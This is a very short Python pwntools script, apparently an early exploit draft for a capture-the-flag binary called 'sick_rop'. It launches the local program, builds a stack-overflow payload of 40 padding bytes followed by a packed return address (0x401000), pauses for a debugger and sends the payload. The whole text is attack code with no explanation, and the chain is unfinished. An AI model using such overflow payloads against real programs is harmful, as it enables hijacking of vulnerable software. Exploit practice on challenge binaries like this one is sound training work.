from pwn import *

p = process('./sick_rop')

payload = 'A'*40+p64(0x401000)

pause()
p.sendline(payload)
